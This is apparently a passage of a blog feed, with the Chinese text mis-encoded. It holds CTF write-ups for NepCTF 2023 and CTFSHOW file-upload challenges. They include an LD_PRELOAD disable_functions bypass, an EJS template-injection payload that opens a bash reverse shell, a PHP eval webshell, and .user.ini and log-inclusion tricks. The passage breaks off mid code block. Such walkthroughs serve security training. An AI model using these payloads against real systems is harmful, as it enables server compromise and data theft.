åˆ°æœåŠ¡å™¨ä¸Šå»ï¼Œå¹¶ä¸”ä½¿ç”¨<code>putenv()</code>å‡½æ•°é‡æ–°è®¾ç½®<code>LD_PRELOAD</code>ç¯å¢ƒå˜é‡ï¼Œæœ€åä½¿ç”¨<code>mb_send_mail()</code>è°ƒç”¨æ¶æ„çš„å‡½æ•°è¿›è¡Œåå¼¹shell</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ²¡æƒé™ä¸Šä¼ æ–‡ä»¶å’Œå†™æ–‡ä»¶ï¼Œç›¸å…³å‡½æ•°è¢«ç¦ç”¨äº†ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç§æ–¹æ³•æ˜¯ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶<code>/tmp/phpxxx</code>ï¼Œç„¶åä½¿ç”¨<code>scandir(&quot;glob:///tmp/php*&quot;)</code>å»æ¨¡ç³ŠåŒ¹é…çš„</p><p>åœ¨æœ¬åœ°å†™ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„<code>html</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTæ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†æ¶æ„çš„<code>.so</code>æ–‡ä»¶ä¸Šä¼ å¹¶æŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸‹é¢å†…å®¹è¿›è¡Œæ›´æ”¹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;/tmp&#x27;</span>));<span class="variable">$a</span>=scandir(<span class="string">&quot;glob:///tmp/php*&quot;</span>);<span class="variable">$filename</span>=<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$a</span>[0];var_dump(<span class="variable">$filename</span>);putenv(<span class="string">&quot;LD_PRELOAD=<span class="variable">$filename</span>&quot;</span>);mb_send_mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/13.png" alt=""></p><p>å‘é€åï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåå¼¹shellæˆåŠŸäº†</p><p><img src="/img/NepCTF-2023/14.png" alt=""></p><p>åˆ©ç”¨çš„æ˜¯phpäº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œè€Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åæ˜¯<strong>éšæœº</strong>çš„ï¼Œå› æ­¤ç”¨<strong>globä¼ªåè®®</strong>å»é”å®šã€‚ç„¶ååŠ«æŒ</p><p>è§¦å‘LD_PRELOADçš„å‡½æ•°ï¼Œå¸¸è§çš„2ä¸ª<code>mailã€error_log</code>éƒ½å¯ä»¥è§¦å‘ç³»ç»Ÿå‡½æ•°<code>send_mail</code>è¿›è€Œè§¦å‘LDåŠ«æŒï¼Œä½†æ˜¯è¿™é‡Œbanäº†è¿™2ä¸ªå‡½æ•°ï¼Œå› æ­¤è¿˜æœ‰ä¸ªæ›¿ä»£å“<code>mb_send_mail</code>æœ€åRCE</p><p>åœ¨æ ¹ç›®å½•ä¸‹æŸ¥çœ‹åˆ°flag</p><p><img src="/img/NepCTF-2023/15.png" alt=""></p><p>ä½†æ˜¯å‘ç°æ²¡æœ‰æƒé™ï¼š</p><p><img src="/img/NepCTF-2023/16.png" alt=""></p><p>ç”¨ç¯å¢ƒå˜é‡ææƒã€‚å› ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªsuidçš„äºŒè¿›åˆ¶æ–‡ä»¶<code>showmsg</code></p><p><img src="/img/NepCTF-2023/17.png" alt=""></p><p>ææƒæˆåŠŸï¼Œç„¶åç»™777æƒé™ç»™flagï¼Œç›´æ¥è¯»å°±å¥½äº†</p><p><img src="/img/NepCTF-2023/18.png" alt=""></p><h2 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h2><p>å…ˆæ‹¿åˆ°é¢˜ç›®ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">templateDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;template&#x27;</span>, templateDir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">milliSeconds</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StartTime</span> =<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() &lt;<span class="title class_">StartTime</span>+milliSeconds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> uuid;</span><br><span class="line">    <span class="keyword">let</span> name = req.<span class="property">query</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> address = req.<span class="property">query</span>.<span class="property">address</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> message = req.<span class="property">query</span>.<span class="property">message</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;&#x27;</span> &amp;&amp; address != <span class="string">&#x27;&#x27;</span> &amp;&amp; message != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> source = [<span class="string">&quot;source&quot;</span>, <span class="string">&quot;source1&quot;</span>, <span class="string">&quot;source2&quot;</span>, <span class="string">&quot;source3&quot;</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.5</span> - <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            fs.<span class="title function_">readFile</span>(source[<span class="number">0</span>]+<span class="string">&quot;.html&quot;</span>, <span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err, pageContent</span>)&#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="title function_">replace</span>(<span class="regexp">/--ID--/g</span>, uuid.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Params `name` or `address` or `message` empty&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/page?pageid=<span class="subst">$&#123;uuid&#125;</span>&amp;name=<span class="subst">$&#123;name&#125;</span>&amp;address=<span class="subst">$&#123;address&#125;</span>&amp;message=<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> id = req.<span class="property">query</span>.<span class="property">pageid</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(id) || !fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;Sorry, no such id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å‘ç°<code>res.render(`$&#123;templateDir&#125;/$&#123;id&#125;.ejs`, req.query);</code>è¿™æ®µæœ‰æ¨¡æ¿æ³¨å…¥çš„ï¼Œä»–æŠŠqueryæ”¾è¿›å»renderäº†ã€‚</p><p>ç½‘ä¸Šæ˜¯æœ‰å…³äºè¿™ä¸ªçš„CVEï¼š<a href="https://inhann.top/2023/03/26/ejs/">CVE-2022-29078</a></p><p><strong>payloadï¼š</strong></p><p>åœ¨urlååŠ å…¥ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#x27;&quot;);&amp;settings[view options][client]=true</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/23.jpg" alt=""></p><p>åå¼¹shellæˆåŠŸï¼</p><p><img src="/img/NepCTF-2023/24.jpg" alt=""></p><p>æ‹¿åˆ°flag</p><p><img src="/img/NepCTF-2023/25.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> NepCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/08/15/CTFSHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/08/15/CTFSHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web151-å‰ç«¯"><a href="#web151-å‰ç«¯" class="headerlink" title="web151(å‰ç«¯)"></a>web151(å‰ç«¯)</h1><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè¿˜è´´å¿ƒçš„å‘Šè¯‰æˆ‘ä»¬<strong>å‰ç«¯æ ¡éªŒä¸å¯é </strong></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151.png" alt=""></p><p>å‡†å¤‡å¥½ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†åç¼€æ”¹ä¸º<code>.png</code> ï¼Œä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_01.png" alt=""></p><p>å°†<code>shell.png</code>æ”¹ä¸º<code>shell.php</code>åï¼Œå‘é€</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_02.png" alt=""></p><p>å¾—åˆ°ä¸Šä¼ è·¯å¾„ï¼Œèšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_03.png" alt=""></p><h1 id="web152"><a href="#web152" class="headerlink" title="web152()"></a>web152()</h1><p>æ“ä½œä¸ä¸Šé¢˜ä¸€æ ·</p><h1 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h1><p>è¿›è¡Œä¸Šé¢˜çš„æ“ä½œæ—¶ï¼Œå‘ç°æ²¡æœ‰è·¯å¾„å›æ˜¾</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/153.png" alt=""></p><p>å°†åç¼€ä¿®æ”¹ä¸º<code>shell.php4</code>åä¸Šä¼ ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯ä¸è§£æ</p><p>è¯•è¯•ä¸Šä¼ é…ç½®æ–‡ä»¶,è®¿é—®upload,å‘ç°æœ‰å¯æ‰§è¡Œæ–‡ä»¶index.php,å¯ä»¥ç”¨ä¸Šä¼ <code>.user.ini</code>æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«</p><blockquote><p>user.ini.å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/<a href="https://so.csdn.net/so/search?q=apache&amp;spm=1001.2101.3001.7020">apache</a>/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚<br>æ¡ä»¶:<br>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP<br>å¯¹åº”ç›®å½•ä¸‹é¢æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶,å¦‚index.php<br>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png <span class="comment">// åŒ…å«shell.pngæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å®Œä¹‹åè®¿é—®<code>/upload/index.php</code>ï¼Œèšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><h1 id="web154"><a href="#web154" class="headerlink" title="web154()"></a>web154()</h1><p>ä¼ é©¬æ—¶ï¼Œå‘ç°æ–‡ä»¶å†…å®¹ä¸åˆè§„</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/154.png" alt=""></p><p>æµ‹è¯•ä¹‹åå‘ç°ä¸èƒ½å­˜åœ¨<code>php</code>å­—æ ·</p><p>å°†æœ¨é©¬æ”¹ä¸º<code>&lt;?= @eval($_POST[1]);?&gt;</code>åä¸Šä¼ ï¼Œå‘ç°å›¾ç‰‡å¯ä»¥ä¸Šä¼ ï¼Œå†åˆ©ç”¨ä¸Šé¢˜çš„æ–¹æ³•ï¼Œæ–‡ä»¶åŒ…å«ä¸Šä¼ çš„<code>shell.png</code></p><p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><h1 id="web155"><a href="#web155" class="headerlink" title="web155()"></a>web155()</h1><p>ä¸Šä¼ å›¾ç‰‡æµ‹è¯•ï¼Œå‘ç°æ–‡ä»¶ç±»å‹ä¸åˆè§„</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/155.png" alt=""></p><p>åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œå†…å®¹å‰åŠ <code>GIF89a</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/155_01.png" alt=""></p><p>åˆ©ç”¨é…ç½®æ–‡ä»¶åŒ…å«ï¼Œä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥æ‹¿flag</p><h1 id="web156"><a href="#web156" class="headerlink" title="web156()"></a>web156()</h1><p>ä¾æ—§æ–‡ä»¶ç±»å‹ä¸åˆæ ¼ï¼Œé‡å¤ä¸Šé¢æ“ä½œè¯•ä¸€ä¸‹ï¼Œç»è¿‡æµ‹è¯•å‘ç°æœ¬é¢˜è¿‡æ»¤äº†<code>[]</code></p><p>å¯ä»¥å°†<code>[]</code>æ›¿æ¢<code>&#123;&#125;</code>è¿›è¡Œç»•è¿‡</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/156.png" alt=""></p><p>ä¸Šä¼ æˆåŠŸï¼Œåˆ©ç”¨é…ç½®æ–‡ä»¶åŒ…å«ï¼Œèšå‰‘è¿æ¥æ‹¿flag</p><h1 id="web157"><a href="#web157" class="headerlink" title="web157()"></a>web157()</h1><p>åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>&#123;&#125;</code>å’Œ<code>;</code>ï¼Œé‚£å°±éƒ½ä¸ç”¨äº†ï¼Œåˆ©ç”¨<code>array_pop()</code>è¿›è¡ŒRCE</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/157.png" alt=""></p><p>å†åˆ©ç”¨é…ç½®æ–‡ä»¶åŒ…å«è¿›è¡Œrce</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®/upload/index.php</span><br><span class="line"></span><br><span class="line">POST: <span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../f*&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web158-log"><a href="#web158-log" class="headerlink" title="web158(log)"></a>web158(log)</h1><p>æ“ä½œä¸ä¸Šé¢˜ä¸€æ ·</p><p>æŸ¥çœ‹æºç å‘ç°è¿‡æ»¤äº†<code>log</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159()"></a>web159()</h1><p>å‘ç°æœ¬é¢˜è¿‡æ»¤äº†<code>()</code></p><p>ä¸ç”¨æ‹¬å·çš„å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ç”¨<code>include</code>è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯ä¸Šé¢˜è¿‡æ»¤äº†<code>log</code>ï¼Œæ‰€ä»¥æœ¬é¢˜ç”¨ç»•è¿‡å…³é”®å­—å’Œ<code>include</code>ç»“åˆ</p><p>æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">include</span> <span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/159.png" alt=""></p><p>å‘ç°ä¸Šä¼ æˆåŠŸï¼Œåˆ©ç”¨é…ç½®æ–‡ä»¶åŒ…å«è¿›è¡ŒRCEï¼Œä¼ é©¬</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/159_01.png" alt=""></p><p>è®¿é—®<code>/upload/index.php</code></p><p>POSTä¼ å‚ï¼š<code>1=system(&#39;cat ../f*&#39;);</code></p><p>æ‹¿åˆ°flag</p><h1 id="web160"><a href="#web160" class="headerlink" title="web160()"></a>web160()</h1><p>æµ‹è¯•åå‘ç°æœ¬é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨bpä¸­çš„åå…­è¿›åˆ¶éƒ¨åˆ†çš„ç©ºæ ¼æ”¹ä¸º<code>0d</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/160.png" alt=""></p><p>é‡å¤ä¸Šé¢˜æ“ä½œå³å¯è·å¾—flag</p><h1 id="web161"><a href="#web161" class="headerlink" title="web161()"></a>web161()</h1><p>å‘ç°æœ¬é¢˜<code>.ini</code>æ–‡ä»¶ä¸è®©ä¸Šä¼ äº†ï¼Œ555</p><p>è¯•éªŒäº†å¾ˆä¹…ï¼Œå‘ç°è¿˜æ˜¯æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå°†é…ç½®æ–‡ä»¶å¤´éƒ¨åŠ ä¸ª<code>GIF89a</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/161.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ æˆåŠŸï¼Œé‡å¤ä¸Šä½“æ“ä½œå³å¯</p><h1 id="web162-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#web162-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="web162(è¿œç¨‹æ–‡ä»¶åŒ…å«)"></a>web162(è¿œç¨‹æ–‡ä»¶åŒ…å«)</h1><p>é‡å¤ä¸Šé¢çš„æ–¹æ³•ï¼Œå‘ç°ä¸è¡Œäº†</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/162.png" alt=""></p><p>ç»è¿‡æµ‹è¯•å‘ç°å†…å®¹ä¸èƒ½æœ‰<code>.</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/162_01.png" alt=""></p><h1 id="web163-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#web163-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="web163(è¿œç¨‹æ–‡ä»¶åŒ…å«)"></a>web163(è¿œç¨‹æ–‡ä»¶åŒ…å«)</h1><h1 id="web164-äºŒæ¬¡æ¸²æŸ“"><a href="#web164-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="web164(äºŒæ¬¡æ¸²æŸ“)"></a>web164(äºŒæ¬¡æ¸²æŸ“)</h1><p>ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶æµ‹è¯•ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164.png" alt=""></p><p>æŸ¥çœ‹åï¼Œå‘ç°URLæœ‰çŒ«è…»</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_01.png" alt=""></p><p>å‘ç°å›¾ç‰‡åå­—è·Ÿæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡åä¸ä¸€è‡´ï¼Œå¯ä»¥çŒœåˆ°è¿™æ˜¯äºŒæ¬¡æ¸²æŸ“çš„ç»“æœ</p><p>å¯ä»¥åˆ©ç”¨è„šæœ¬åˆ¶ä½œå›¾ç‰‡é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 